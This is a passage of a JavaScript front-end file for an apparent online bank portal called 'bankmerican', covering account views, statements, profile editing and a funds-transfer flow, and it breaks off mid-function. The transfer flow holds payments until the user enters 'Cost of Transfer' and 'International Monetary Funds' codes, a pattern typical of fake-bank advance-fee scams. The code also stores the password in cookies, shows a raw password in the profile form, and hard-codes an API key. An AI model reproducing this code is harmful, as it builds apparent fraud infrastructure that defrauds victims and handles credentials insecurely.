var slideSpeed = 500;
var tabEffect = "fade"; //slide, fade
const CLOUDNARY_URL = "https://api.cloudinary.com/v1_1/dp1lewjma/image/upload";
const CLOUDNARY_UPLOAD_PRESET = "tmqoqgpt";
const KEY_ENC = Cookies.get("PHPSESSID");

$('document').ready(function() {
    "use strict";

    var _ust_ = getCookies("_ust_", KEY_ENC);
    var case_1 = getCookies("_bankmerican231", KEY_ENC);
    var _hi_ = getCookies("_hi_", KEY_ENC);
    let act = $('#activate-code').val();


    $('#slider1').anythingSlider({
        buildNavigation: false,
        buildArrows: true,
        height: 248,
        width: 690,
        autoPlay: true,
        delay: 10000,
        animationTime: 500,
        startText: "<div class='play_custom' />",
        stopText: "<div class='stop_custom' />",
        startPanel: 1
    });

    $('#slider2').anythingSlider({
        buildNavigation: false,
        buildArrows: true,
        height: 248,
        width: 690,
        autoPlay: true,
        delay: 10000,
        animationTime: 500,
        startText: "<div class='play_custom' />",
        stopText: "<div class='stop_custom' />"

    });


    var file;

    var PUBLIC_ID_ACT;
    var fileupload = document.getElementById('img');
    if (fileupload !== null) {
        fileupload.addEventListener('change', function(event) {
            file = event.target.files[0];
        });

    }





    //currency symbol json formats
    var currency = {
        'DKK': 'Kr',
        'GBP': '£',
        'EUR': '€',
        'USD': '$',
        'HKD': 'HK$',
        'HUF': 'Ft',
        'INR': '₹',
        'JPY': '¥',
        'MXN': '$',
        'MYR': 'RM',
        'GHS': '¢',
        'NOK': 'kr',
        'NZD': '$',
        'NGN': '₦',
        'PHP': '₱',
        'RUB': '₽',
        'SEK': 'Kr',
        'SGD': '$',
        'THB': '฿',
        'TRY': '₺',
        'ZAR': 'R'
    };

    var money = {
        "disclaimer": "Usage subject to terms: https://openexchangerates.org/terms",
        "license": "https://openexchangerates.org/license",
        "timestamp": 1520103605,
        "base": "USD",
        "rates": {
            "AED": 3.673014,
            "AFN": 69.475,
            "ALL": 107.5,
            "AMD": 480.77,
            "ANG": 1.784194,
            "AOA": 215.1155,
            "ARS": 20.264,
            "AUD": 1.287333,
            "AWG": 1.786505,
            "AZN": 1.68825,
            "BAM": 1.58875,
            "BBD": 2,
            "BDT": 82.977763,
            "BGN": 1.58816,
            "BHD": 0.377075,
            "BIF": 1775,
            "BMD": 1,
            "BND": 1.321966,
            "BOB": 6.910011,
            "BRL": 3.2527,
            "BSD": 1,
            "BTC": 0.000087237743,
            "BTN": 65.19905,
            "BWP": 9.578914,
            "BYN": 1.965596,
            "BZD": 2.009098,
            "CAD": 1.288544,
            "CDF": 1615,
            "CHF": 0.938145,
            "CLF": 0.0225,
            "CLP": 598.8,
            "CNH": 6.330917,
            "CNY": 6.3484,
            "COP": 2867,
            "CRC": 569.71,
            "CUC": 1,
            "CUP": 25.5,
            "CVE": 89.7375,
            "CZK": 20.5916,
            "DJF": 177.075,
            "DKK": 6.0457,
            "DOP": 49.13,
            "DZD": 114.04071,
            "EGP": 17.641,
            "ERN": 14.996667,
            "ETB": 27.56,
            "EUR": 0.81179,
            "FJD": 2.021996,
            "FKP": 0.7246,
            "GBP": 0.7246,
            "GEL": 2.463723,
            "GGP": 0.7246,
            "GHS": 4.46,
            "GIP": 0.7246,
            "GMD": 47.2,
            "GNF": 9000,
            "GTQ": 7.373907,
            "GYD": 206.445,
            "HKD": 7.83065,
            "HNL": 23.601015,
            "HRK": 6.038184,
            "HTG": 64.297808,
            "HUF": 254.66,
            "IDR": 13730.326709,
            "ILS": 3.442442,
            "IMP": 0.7246,
            "INR": 65.1967,
            "IQD": 1183,
            "IRR": 37302.484098,
            "ISK": 100.59,
            "JEP": 0.7246,
            "JMD": 127.1499,
            "JOD": 0.709001,
            "JPY": 105.75296581,
            "KES": 101.3855,
            "KGS": 68.035298,
            "KHR": 4002,
            "KMF": 399.45,
            "KPW": 900,
            "KRW": 1079.43,
            "KWD": 0.299888,
            "KYD": 0.832789,
            "KZT": 322.647036,
            "LAK": 8305,
            "LBP": 1512.5,
            "LKR": 155.13,
            "LRD": 130.5,
            "LSL": 11.91,
            "LYD": 1.33,
            "MAD": 9.2,
            "MDL": 16.695982,
            "MGA": 3117.5,
            "MKD": 49.983876,
            "MMK": 1339.7,
            "MNT": 2390.948643,
            "MOP": 8.06072,
            "MRO": 356,
            "MRU": 35.3,
            "MUR": 33.04,
            "MVR": 15.460011,
            "MWK": 725.725,
            "MXN": 18.8111,
            "MYR": 3.930279,
            "MZN": 61.855,
            "NAD": 11.915,
            "NGN": 360.5,
            "NIO": 31.085,
            "NOK": 7.795175,
            "NPR": 104.297226,
            "NZD": 1.382,
            "OMR": 0.384918,
            "PAB": 1,
            "PEN": 3.2565,
            "PGK": 3.195,
            "PHP": 51.939,
            "PKR": 110.65,
            "PLN": 3.40025,
            "PYG": 5550.4,
            "QAR": 3.641996,
            "RON": 3.782471,
            "RSD": 95.696456,
            "RUB": 56.815,
            "RWF": 856,
            "SAR": 3.75015,
            "SBD": 7.76394,
            "SCR": 13.699823,
            "SDG": 18.01,
            "SEK": 8.2507,
            "SGD": 1.319697,
            "SHP": 0.7246,
            "SLL": 7668.450022,
            "SOS": 582,
            "SRD": 7.468,
            "SSP": 130.2634,
            "STD": 19933.390132,
            "STN": 19.985,
            "SVC": 8.745727,
            "SYP": 514.98999,
            "SZL": 11.91,
            "THB": 31.4465,
            "TJS": 8.820764,
            "TMT": 3.499986,
            "TND": 2.4212,
            "TOP": 2.217721,
            "TRY": 3.806784,
            "TTD": 6.73915,
            "TWD": 29.283,
            "TZS": 2254.1,
            "UAH": 26.5275,
            "UGX": 3648.3,
            "USD": 1,
            "UYU": 28.40176,
            "UZS": 8180,
            "VEF": 28960,
            "VND": 22757.110027,
            "VUV": 105.255077,
            "WST": 2.5271,
            "XAF": 532.499333,
            "XAG": 0.06061195,
            "XAU": 0.00075614,
            "XCD": 2.70255,
            "XDR": 0.689644,
            "XOF": 532.499333,
            "XPD": 0.00100706,
            "XPF": 96.872315,
            "XPT": 0.00103467,
            "YER": 250.325,
            "ZAR": 11.923055,
            "ZMW": 9.74,
            "ZWL": 322.355011
        }
    }


    function format(n, currency) {
        if (currency !== undefined)
            return currency + "" + n.toFixed(2).replace(/(\d)(?=(\d{3})+\.)/g, "$1,");
        else
            return n.toFixed(2).replace(/(\d)(?=(\d{3})+\.)/g, "$1,");
    }

    //add rows to table function
    function add_rows(target, count, cells) {
        for (var i = 0; i < count; i++) {
            var row = $('<tr/>');
            for (var c = 0; c < cells.length; c++) {
                row.append($('<td>' + cells[c] + '</td>'));
            }
            $(target).append(row);
        }
    }


    var table = document.getElementById("currency-rates");
    var cur;
    var b;
    var s;

    $.getJSON(
        // NB: using Open Exchange Rates here, but you can use any source!
        'https://openexchangerates.org/api/latest.json?app_id=c7cb310e507d47588e5a6d5c1a545f76',
        function(data) {
            // Check money.js has finished loading:
            if (typeof fx !== "undefined" && fx.rates) {
                fx.rates = data.rates;
                fx.base = data.base;


                for (var v in fx.rates) {
                    for (var d in currency) {
                        cur = d;
                        b = fx.rates[d];
                        s = format(b) * 0.8;
                        add_rows(table, 1, [cur, b, s]);
                    }
                    break;
                }
            } else {
                // If not, apply to fxSetup global:

                for (var v in money.rates) {
                    for (var d in currency) {
                        cur = d;
                        b = money.rates[d];
                        s = format(b) * 0.8;
                        add_rows(table, 1, [cur, b, s]);
                    }
                    break;

                }

                var fxSetup = {
                    rates: data.rates,
                    base: data.base
                }
            }
        }
    );




    var account_name = document.getElementById("account-name");
    var account_number = document.getElementById("account-number");
    var account_status = document.getElementById("account-status");
    var account_type = document.getElementById("account-type");
    var account_balance = document.getElementById("accountbalance");

    var select_account = document.getElementById("select_table");
    //side-left bar details
    var side_fullname = document.getElementById("user-fullname");
    var side_status = document.getElementById("side-accountstatus");
    var side_balance = document.getElementById("side-account-balance");
    var last_login = document.getElementById("last-login");
    var login_ip = document.getElementById("login-ip");

    var custom_alert = document.getElementsByClassName("custom-alert");




    var pagename;


    var a = getCookies("_bankmerican231", KEY_ENC);

    var b = getCookies("user", KEY_ENC);
    var c = getCookies("userpass", KEY_ENC);
    var d = getCookies("_hi_", KEY_ENC);
    var p = getCookies("PUBLIC_ID_ACT");



    var sessionexpire = new Date(new Date().getTime() + 60 * 170 * 60 * 1000);

    function sign_out() {
        Object.keys(Cookies.get()).forEach(function() {
            var attr = {
                path: '/',
                expires: sessionexpire
            }
            for (var i = 0; i < arguments.length; i++) {
                Cookies.remove(arguments[i], attr);
            }
        });
        window.location = '/?logged_out=true';
    }



    //sign out
    $('#signout').click(function() {
        sign_out("user", "_bankmerican231", "_hi_", "userpass", "PUBLIC_ID_ACT");
    });


    function show_profile_img(a, b) {

        if (b !== null && a !== null || b !== undefined) {
            var profile_img = document.getElementById(a);
            profile_img.src = b;
        } else if (a !== null && b === null || b === undefined) {
            var profile_img = document.getElementById(a);
            profile_img.src = "http://res.cloudinary.com/dp1lewjma/image/upload/v1523983914/defaults/fff.png";
        }
    }

    function show_profile_img_q(a, b) {

        if (b !== null && a !== null || a !== undefined || b !== undefined) {
            var profile_img = document.querySelector(a);
            profile_img.src = b;
        } else if (a !== null && b === null || b === undefined || a === undefined) {
            var profile_img = document.querySelector(a);
            profile_img.src = "http://res.cloudinary.com/dp1lewjma/image/upload/v1523983914/defaults/fff.png";
        } else {
            return false;
        }
    }

    //set profile image for all pages
    if (find_pagename("EntryPass")) {
        show_profile_img("profile_img", p);
        pagename = "EntryPass";

    } else if (find_pagename("myaccounts")) {
        show_profile_img("profile_img", p);
        pagename = "myaccounts";



        setInterval(function() {
            getAccountData('../server/app/mainapp.php', 'page=' + pagename + '&pin=' + a + '&username=' + b + '&default=' + "true", true);
        }, 1000);

        getAccountData('../server/app/mainapp.php', 'page=' + pagename + '&pin=' + a);

        getAccountData('../server/app/mainapp.php', 'page=' + pagename + '&pin=' + a + '&username=' + b + '&default=' + "true");
        getAccountData('../server/app/tmp.php', 'page=' + pagename + '&pin=' + a + '&username=' + b + '&default=' + "false");




        var getTrans = [];
        //main transfer protocol here
        getTrans = {
            pin: case_1,
            login_id: _hi_,
            statement: "true"
        };

        ajaxcall('../server/_234T.php', getTrans, function(res, err) {
            var d = document.getElementById('statement_table');
            $(".no-transaction").remove();
            getTrans = {
                pin: case_1,
                login_id: _hi_
            };

            let transaction_date;
            let transaction_type;
            let transaction_number;
            let transaction_desc;
            let amount;
            let balance;
            let transaction_status;

            for (let i = 0; i < res.length; i++) {
                const element = res[i];
                transaction_date = (element.transaction_date == null) ? '-' : element.transaction_date;
                transaction_type = (element.transaction_type == null) ? '-' : element.transaction_type;
                transaction_number = (element.transaction_number == null) ? '-' : element.transaction_number;
                transaction_desc = (element.transaction_desc == null) ? '-' : element.transaction_desc;
                amount = (element.amount == null) ? '-' : element.amount;
                balance = (element.balance == null) ? '-' : element.balance;
                transaction_status = (element.transaction_status == null) ? '-' : element.transaction_status;

                add_rows(d, 1, [transaction_date, transaction_number, transaction_type, transaction_desc, amount, balance, transaction_status]);
            }

        });



    } else if (find_pagename("services")) {
        show_profile_img("profile_img", p);
        pagename = "services";

        setInterval(function() {
            getAccountData('../../server/app/mainapp.php', 'page=' + pagename + '&pin=' + a + '&username=' + b + '&default=' + "true");
        }, 1000);

    } else if (find_pagename("eStatements")) {
        show_profile_img("profile_img", p);
        pagename = "eStatements";
        var getTrans = [];
        //main transfer protocol here
        getTrans = {
            pin: case_1,
            login_id: _hi_,
            statement: "true"
        };
        setInterval(function() {
            getAccountData('../server/app/mainapp.php', 'page=' + pagename + '&pin=' + a + '&username=' + b + '&default=' + "true", null, function(params) {});
        }, 1000);

        ajaxcall('../server/_234T.php', getTrans, function(res, err) {
            var d = document.getElementById('statement_table');
            $("#default_row").remove();
            getTrans = {
                pin: case_1,
                login_id: _hi_
            };
            ajaxcall('../server/_234T.php', getTrans, function(res, err) {
                for (let j = 0; j < res.length; j++) {
                    const re = res[j];
                    if (re.accountnumber !== undefined) {

                        $('#select_statement_account').append('<option value=' + re.accountnumber + ' selected>' + re.accounttype + ' ' + re.accountnumber + '</option>');
                        $('#select_statement_account').css('background', '#401A4E');
                        $('#select_statement_account').css('color', '#ddd');
                        $('#select_statement_account').css('font-weight', 'bold');
                    }
                }
            });

            let transaction_date;
            let transaction_type;
            let transaction_number;
            let transaction_desc;
            let amount;
            let balance;
            let transaction_status;

            for (let i = 0; i < res.length; i++) {
                const element = res[i];
                transaction_date = (element.transaction_date == null) ? '-' : element.transaction_date;
                transaction_type = (element.transaction_type == null) ? '-' : element.transaction_type;
                transaction_number = (element.transaction_number == null) ? '-' : element.transaction_number;
                transaction_desc = (element.transaction_desc == null) ? '-' : element.transaction_desc;
                amount = (element.amount == null) ? '-' : element.amount;
                balance = (element.balance == null) ? '-' : element.balance;
                transaction_status = (element.transaction_status == null) ? '-' : element.transaction_status;

                add_rows(d, 1, [transaction_date, transaction_number, transaction_type, transaction_desc, amount, balance, transaction_status]);
            }

        });

    } else if (find_pagename("processingtransfer")) {
        show_profile_img("profile_img", p);
        pagename = "processingtransfer";
        setInterval(function() { getAccountData('../../server/app/mainapp.php', 'page=' + pagename + '&pin=' + a + '&username=' + b + '&default=' + "true"); }, 1000);


        var recipient = sessionStorage.getItem("recipient");
        var fro = sessionStorage.getItem("from");
        var to = sessionStorage.getItem("to");
        var receivers_bankname = sessionStorage.getItem("receiving_bankname");
        var receivers_bankaddress = sessionStorage.getItem("receiving_address");
        var receivers_swift = sessionStorage.getItem("receiving_swift");
        var amount = sessionStorage.getItem("amount");
        var description = sessionStorage.getItem("description");
        var delivery_time = sessionStorage.getItem("time");
        var delivery_date = sessionStorage.getItem("date");
        var reference = sessionStorage.getItem("reference");
        var transaction_reference = sessionStorage.getItem("transaction_reference");
        var currency = getCookies("currency", KEY_ENC);

        var dayword = ["Sunday", "Monday", "Tuesday", "Wednesday", "Thursday", "Friday", "Saturday"];
        if (recipient != null &&
            fro != null &&
            to != null &&
            receivers_bankname != null &&
            receivers_bankaddress != null &&
            receivers_swift != null &&
            amount != null &&
            description != null ||

            (
                delivery_time != null &&
                delivery_time != null)
        ) {

            $('.bar-content').css("visibility", "visible");



            var link_click = false;

            $('a').click(function() {
                link_click = true;
            });

            $('.bar-content  button:last-child').click(function() {
                var confirmcancel = window.confirm("About to terminate current transfer!");
                if (confirmcancel == true) {
                    let datdf = {
                        pin: case_1,
                        login_id: _hi_,
                    }
                    let currentbalance

                    getbalance(datdf, function(res) {
                        const initialbalance = parseInt(res[0].amount);
                        currentbalance = initialbalance;
                        transferdata["transaction_status"] = "Cancelled";
                        transferdata["balance"] = currentbalance;

                        calltransaction(transferdata, function(params) {
                            if (params == "success") { window.location = "services"; }

                        });
                    });

                    window.location = "services";
                }
            });

            window.unload = function(e) {
                window.location = "services";
            }



            var transferdata = [];
            //main transfer protocol here
            transferdata = {
                pin: case_1,
                login_id: _hi_
            };
            transferdata["receivers_name"] = recipient;
            transferdata["from_"] = fro;
            transferdata["to_"] = to;
            transferdata["receivers_bankaddress"] = receivers_bankaddress;
            transferdata["receivers_bankname"] = receivers_bankname;
            transferdata["receivers_swift"] = receivers_swift;
            transferdata["amount"] = +"-" + amount;
            transferdata["transaction_desc"] = description;
            transferdata["transaction_type"] = "Transfer - Other";
            transferdata["transfer"] = "true";
            //   transferdata["transaction_date"] = dayword[date.getDay()] + " " + date.getMonth() + " " + date.getFullYear();
            transferdata["transaction_reference"] = reference;
            transferdata["transaction_number"] = transaction_reference;


            window.onbeforeunload = function(e) {

                let datdf = {
                    pin: case_1,
                    login_id: _hi_,
                }
                let currentbalance


                if (link_click == true && transeferpage != "cotverified") {
                    getbalance(datdf, function(res) {
                        const initialbalance = parseInt(res[0].amount);
                        currentbalance = initialbalance;
                        transferdata["transaction_status"] = "Cancelled";
                        transferdata["balance"] = currentbalance;

                        calltransaction(transferdata, function(params) {
                            if (params == "success") {}

                        });
                    });

                    window.location = "services";
                } else {
                    getbalance(datdf, function(res) {
                        const initialbalance = parseInt(res[0].amount);
                        currentbalance = initialbalance;
                        transferdata["transaction_status"] = "Cancelled";
                        transferdata["balance"] = currentbalance;

                        calltransaction(transferdata, function(params) {
                            if (params == "success") {
                                window.location = "services";
                            }

                        });
                    });

                    return false;
                }

                return false;
            }





            setTimeout(() => {
                ajaxcall('../../server/_234T.php', transferdata, function(res, err) {

                    if (err == null) {
                        var cot;
                        var imf;

                        for (let i = 0; i < res.length; i++) {
                            const element = res[i];
                            cot = element.cot_code;
                            imf = element.imf_code;
                        }

                        /*
                                            Input cot code one time only
                                                                $(".code-filling").addClass("code");
                                                                $('.model,.code-center').fadeIn('100').css("visibility", "visible");
                                                                $('label[for=code]').html("Cost of Transfer(Code)");
                                                                $('#activate-code').val();
                                                                transaction('../../server/app/transaction.php', { transfer: data });
                                            */

                        // verify cot code
                        const con = sessionStorage.getItem("cot");


                        if (cot != null && cot == "verified") {
                            if (imf == "verified") {
                                var date = new Date();
                                transferdata["receivers_name"] = recipient;
                                transferdata["from_"] = fro;
                                transferdata["to_"] = to;
                                transferdata["receivers_bankaddress"] = receivers_bankaddress;
                                transferdata["receivers_bankname"] = receivers_bankname;
                                transferdata["receivers_swift"] = receivers_swift;
                                transferdata["amount"] = amount;
                                transferdata["transaction_desc"] = description;
                                transferdata["transaction_type"] = "Transfer - Other";
                                transferdata["transfer"] = "true";
                                //   transferdata["transaction_date"] = dayword[date.getDay()] + " " + date.getMonth() + " " + date.getFullYear();
                                transferdata["transaction_reference"] = reference;
                                transferdata["transaction_number"] = transaction_reference;

                                setTimeout(() => {
                                    try {


                                        let datdf = {
                                            pin: case_1,
                                            login_id: _hi_,
                                        }
                                        let currentbalance

                                        getbalance(datdf, function(res) {
                                            const initialbalance = parseFloat(res[0].amount);
                                            var limit = parseFloat(res[0].transaction_limit);
                                            var sessionexpire = new Date(new Date().getTime() + 60 * 170 * 60 * 1000);

                                            currentbalance = initialbalance - amount;
                                            currentbalance = currentbalance < 5 ? 5 : Number(currentbalance);

                                            datdf["amount"] = currentbalance;
                                            datdf = JSON.stringify(datdf);

                                            ajaxcall("../../server/app/transaction.php", {
                                                updatebalance: datdf
                                            }, function(params) {

                                                if (params == "success") {

                                                    transferdata["transaction_status"] = "Success";
                                                    transferdata["balance"] = currentbalance;

                                                    calltransaction(transferdata, function(params) {
                                                        if (params == "success") {
                                                            setTimeout(() => {
                                                                $('.bar-content').css("width", "100%");
                                                                $('.bar-content').css("margin-left", "-120px");
                                                                $('.bar-content').html("<span style='font-size:1.2em'><img src='../../images/icons/checked.png' style='position:relative;left:-10px'/>Success ! Your request for Funds transfer submitted successfully.</span><br><span>Confirmation# " + reference + "</span> <br><span>" + currency + " " + amount + " transferred to " + to + "</span><br><span>Please note the Reference ID: " + transaction_reference + " for future References</span><div class='trans_btns'>    <button onclick='window.location='services' '>Make another transfer</button>    <button onclick='window.location='../../myaccounts' ' >Close</button></div>");
                                                                if (amount >= limit) {
                                                                    setCookies("D_ALL", true, KEY_ENC, { path: '/', expires: sessionexpire });
                                                                } else {
                                                                    //alert(limit);
                                                                }
                                                            }, date.getMilliseconds() * 40);

                                                        } else {
                                                            $('.bar-content').css("width", "100%");
                                                            $('.bar-content').css("margin-left", "-120px");
                                                            $('.bar-content').html("<span style='font-size:1.2em'><img src='../../images/icons/error.png' style='position:relative;left:-10px'/>Error ! Your request for Funds transfer failed. please contact customer care</span><br><span>Please note the Reference ID: " + transaction_reference + " for future References</span>");
                                                            return false;
                                                        }

                                                    });
                                                }

                                            });

                                        });




                                    } catch (error) {
                                        alert(error);
                                    }

                                }, date.getMilliseconds() * 40);

                            } else
                            if (imf != "verified" && con == "verified" || transeferpage == "cotverified") {
                                setTimeout(() => {

                                    $('.code-center  .close').css("visibility", "hidden");
                                    $('.model,.code-center').fadeIn('500').css("visibility", "visible");
                                    $('label[for=code]').html("International Monetary Funds (Code)");

                                    $('.code-lock').click(function(e) {
                                        const val = $('#activate-code').val();
                                        if (val == "") {
                                            alertMessage('.alert_model .model-center', "International Monetary Funds input is empty");
                                        } else
                                        if (val == imf) {

                                            var code_veri = {
                                                "cot_code": con,
                                                "imf_code": con
                                            }

                                            var transfer_data = JSON.stringify(code_veri);
                                            ajaxcall('../../server/app/transaction.php', { verify_code: transfer_data }, function(res, err) {
                                                if (res == "success") {

                                                    var date = new Date();
                                                    transferdata["receivers_name"] = recipient;
                                                    transferdata["from_"] = fro;
                                                    transferdata["to_"] = to;
                                                    transferdata["receivers_bankaddress"] = receivers_bankaddress;
                                                    transferdata["receivers_bankname"] = receivers_bankname;
                                                    transferdata["receivers_swift"] = receivers_swift;
                                                    transferdata["amount"] = amount;
                                                    transferdata["transaction_desc"] = description;
                                                    transferdata["transaction_type"] = "Transfer - Other";
                                                    transferdata["transfer"] = "true";
                                                    ///      transferdata["transaction_date"] = dayword[date.getDay()] + " " + date.getMonth() + " " + date.getFullYear();
                                                    transferdata["transaction_reference"] = reference;
                                                    transferdata["transaction_number"] = transaction_reference;

                                                    try {

                                                        let datdf = {
                                                            pin: case_1,
                                                            login_id: _hi_,
                                                        }
                                                        let currentbalance;

                                                        getbalance(datdf, function(res) {
                                                            const initialbalance = parseInt(res[0].amount);
                                                            currentbalance = initialbalance - amount;
                                                            currentbalance = currentbalance < 5 ? 5 : Number(currentbalance);

                                                            datdf["amount"] = currentbalance;
                                                            datdf = JSON.stringify(datdf);

                                                            ajaxcall("../../server/app/transaction.php", { updatebalance: datdf }, function(params) {

                                                                if (params == "success") {
                                                                    transferdata["transaction_status"] = "Success";
                                                                    transferdata["balance"] = currentbalance;

                                                                    calltransaction(transferdata, function(params) {
                                                                        if (params == "success") {
                                                                            setTimeout(() => {
                                                                                $('.bar-content').css("width", "100%");
                                                                                $('.bar-content').css("margin-left", "-120px");
                                                                                $('.bar-content').html("<span style='font-size:1.2em'><img src='../../images/icons/checked.png' style='position:relative;left:-10px'/>Success ! Your request for Funds transfer submitted successfully.</span><br><span>Confirmation# " + reference + "</span> <br><span>" + currency + " " + amount + " transferred to " + to + "</span><br><span>Please note the Reference ID: " + transaction_reference + " for future References</span><div class='trans_btns'>    <button onclick='window.location='services' '>Make another transfer</button>    <button onclick='window.location='../../myaccounts' >Close</button></div>");
                                                                            }, date.getMilliseconds() * 40);

                                                                        } else {
                                                                            $('.bar-content').css("width", "100%");
                                                                            $('.bar-content').css("margin-left", "-120px");
                                                                            $('.bar-content').html("<span style='font-size:1.2em'><img src='../../images/icons/error.png' style='position:relative;left:-10px'/>Error ! Your request for Funds transfer failed. please contact customer care</span><br><span>Please note the Reference ID: " + transaction_reference + " for future References</span>");
                                                                            return false;
                                                                        }
                                                                    });

                                                                }

                                                            });

                                                        });


                                                    } catch (error) {
                                                        alert(error);
                                                    }

                                                }
                                            });

                                        } else {
                                            alertMessage('.alert_model .model-center', "Invalid International Monetary Funds code");
                                        }

                                    });
                                }, 6000);


                            }


                        } else
                        if (cot == "" || cot == "0") {
                            alertMessage('.alert_model .model-center', "Error: Please contact customer care on support.customercare@bankmerican.net");
                            $('.bar-content').html("Error: Please contact customer care on support.customercare@bankmerican.net");
                            $('.bar-content').css("font-size", "2em");
                            return false;
                        } else
                        if ((cot != "verified" && cot != "")) {
                            setTimeout(() => {

                                $('.code-center  .close').css("visibility", "hidden");
                                $('.model,.code-center').fadeIn('500').css("visibility", "visible");
                                $('label[for=code]').html("Cost of Transfer(Code)");

                                //transferdata.push(val);
                                $('.code-lock').click(function(e) {
                                    const val = $('#activate-code').val();
                                    if (val == "") {
                                        alertMessage('.alert_model .model-center', "Cost of Transfer input is empty");
                                    } else
                                    if (val == cot) {
                                        var code_veri = {
                                            "cot_code": "verified"
                                        }

                                        var transfer_data = JSON.stringify(code_veri);
                                        ajaxcall('../../server/app/transaction.php', {
                                            verify_code: transfer_data
                                        }, function(res, err) {
                                            if (res == "success") {
                                                window.open("processingtransfer#?cotverified", "_self");
                                                sessionStorage.setItem("cot", "verified");
                                                window.location.reload(true);
                                            }
                                            return err;
                                        });
                                    } else {
                                        alertMessage('.alert_model .model-center', "Invalid cost of transfer code");
                                    }

                                });
                            }, 8000);

                        }

                    } else {
                        alertMessage('.alert_model .model-center', err);
                    }
                });

            }, 1000);



            setTimeout(() => {
                $('.bar-content').html("Error : Transfer timeout 4m: please return to transfer page to <a href='services'>continue</a> transfer");
                $('.bar-content').css("font-size", "2em");
                $('.model,.code-center').fadeOut('100').css("visibility", "hidden");
                return false;
            }, 240000);

        } else {
            window.location = "services";
        }






    } else if (find_pagename("myprofile")) {
        var sessionexpire = new Date(new Date().getTime() + 60 * 170 * 60 * 1000);
        show_profile_img("profile_img", p);
        pagename = "myprofile";

        $("#edit_email").on('click', '.fa-times', function() {
            $('#edit_email i').fadeOut(500).removeClass('fa-times');
            $('#edit_email i').fadeIn('500').addClass('fa-edit');

            $("#email").attr('disabled', 'true');
            $("#phone").attr('disabled', 'true');
            $('#confirm-email-div').slideUp('500').css("display", "none");
        });

        $("#edit_email").on('click', '.fa-edit', function() {
            $('#edit_email i').fadeOut(500).removeClass('fa-edit');
            $('#edit_email i').fadeIn('500').addClass('fa-times');
            $('#confirm-email-div').slideDown('500').css("display", "block");
            $("#email").removeAttr('disabled');
            $("#phone").removeAttr('disabled');
        });






        $("#edit_password").on('click', '.fa-times', function() {
            $('#edit_password i').fadeOut(500).removeClass('fa-times');
            $('#edit_password i').fadeIn('500').addClass('fa-edit');

            $("#password").attr('disabled', 'true');
            $('#confirm-password-div').slideUp('500').css("display", "block");
        });

        $("#edit_password").on('click', '.fa-edit', function() {
            $('#edit_password i').fadeOut(500).removeClass('fa-edit');
            $('#edit_password i').fadeIn('500').addClass('fa-times');

            $("#password").removeAttr('disabled');
            $('#confirm-password-div').slideDown('500').css("display", "block");
        });


        $('#edit_security ').on('click', '.fa-edit', function() {
            $('#edit_security i').fadeOut(500).removeClass('fa-edit');
            $('#edit_security i').fadeIn('500').addClass('fa-times');

            $("#question").removeAttr('disabled');
            $("#answer").removeAttr('disabled');
            $("#nextofkin").removeAttr('disabled');
        });


        $("#edit_security").on('click', '.fa-times', function() {
            $('#edit_security i').fadeOut(500).removeClass('fa-times');
            $('#edit_security i').fadeIn('500').addClass('fa-edit');

            $("#question").attr('disabled', 'true');
            $("#answer").attr('disabled', 'true');
            $("#nextofkin").attr('disabled', 'true');
        });


        getAccountData('../server/app/tmp.php', 'page=' + pagename + '&pin=' + a + '&username=' + b,
            1000,
            function(res) {


                show_profile_img_q('#output_image', res[0].PUBLIC_ID_ACT);
                $('#title').val(res[0].title);
                $('#surname').val(res[0].lastname);
                $('#middle_name').val(res[0].othername);
                $('#firstname').val(res[0].firstname);
                $('#gender').val(res[0].gender);

                let dob = res[0].dob.split("/");

                $('#day').val(dob[0]);
                $('#month').val(dob[1]);
                $('#year').val(dob[2]);

                $('#marital').val(res[0].maritalstatus);
                $('#occupation').val(res[0].Occupation);
                $('#address').val(res[0].address);
                $('#city').val(res[0].city);
                $('#state').val(res[0].state);

                $('#zipcode').val(res[0].Zipcode);
                $('#nation').val(res[0].nationality);
                $('#address').val(res[0].address);
                $('#email').val(res[0].email);
                $('#phone').val(res[0].mobile_num);
                $('#password').val(res[2].password_raw);
                $('#question').val(res[0].question);
                $('#answer').val(res[0].answer);
                $('#nextofkin').val(res[0].nextofkin);

            });

        setInterval(function() {
            getAccountData('../server/app/mainapp.php', 'page=' + pagename + '&pin=' + a + '&username=' + b + '&default=' + "true",
                1000);
        }, 1000);


    }

    function calltransaction(data, res) {
        if (typeof data == "undefined") { return res("object is undefined") } else
        if (typeof data == "object") {
            data = JSON.stringify(data);
            ajaxcall('../../server/app/transaction.php', { transfer: data }, function(params) {
                return res(params);
            });
        } else {
            throw "data parsed must be an object";
        }
    }


    function getbalance(data, params) {
        ajaxcall('../../server/_234T.php', data, function(res, err) {
            return params(res);
        });

    }


    function alertMessage(as, message) {

        $(as).slideDown("2000").css("visibility", "visible");
        zounds.playURL('../../styles/sound/alarm11.wav');

        $(as).html(message);
        $(as).css("text-align", "center");

        setTimeout(function() {
            $(as).slideUp('1000');
            zounds.stop();
        }, 2000);
        setTimeout(function() {
            $(as).style.visibility = "hidden";
        }, 2500);

        setTimeout(function() {
            $(as).slideUp('1000');
            zounds.stop();
        }, 2000);
        setTimeout(function() {
            $(as).style.visibility = "hidden";
        }, 2500);

        return true;
    }
    //.End of alert function


    function ajaxcall(url, data, callback) {

        $.ajax({

            type: "GET",
            url: url,
            data: data,
            cache: false,
            dataType: 'json',
            success: function(res) {
                callback(res);
            },
            error: function(error) {
                callback(null, error);
            }

        });
    }




    $('#submit_profile').click(function() {
        const login_id = getCookies("_hi_", KEY_ENC);
        var userimage = document.getElementById('output_image');

        var day;
        var month;
        var year;
        var nationality;
        var accounttype;
        var amount;
        var accountstatus;
        var currency;
        //Per Info Values
        var title = $('#title').val();
        var firstname = $('#firstname').val();
        var othername = $('#middle_name').val();
        var lastname = $('#surname').val();
        var gender = $('#gender').val();
        var marital = $('#marital').val();
        var occupation = $('#occupation').val();


        //var nationality= $("#Nation option" ).attr("value");
        var address = $('#addres').val();
        var city = $('#city').val();
        var state = $('#state').val();
        var zipcode = $('#zipcode').val();

        day = $('#day').val();
        month = $('#month').val();
        year = $('#year').val();
        nationality = $('#nation').val();
        var email = $('#email').val();
        var confirmemail = $('#confirm_email').val();
        var mobile_number = $('#phone').val();

        //Security Information Values
        var question = $('#question').val();
        var answer = $('#answer').val();
        var NextOfKin = $('#nextofkin').val();

        var password = $('#password').val();
        var confirm_password = $('#confirm_password').val();
        var change_password = false;
        if (!$("#password").prop('disabled')) {
            if ((password.valueOf() != confirm_password.valueOf())) {
                alertMessage('.alert_model > .model-center', "Your password is not yet confirmed");
                $('#find_confrim_error').html("<i class='fa fa-info'></i> enter same password on <b>Confirm Password</b>");
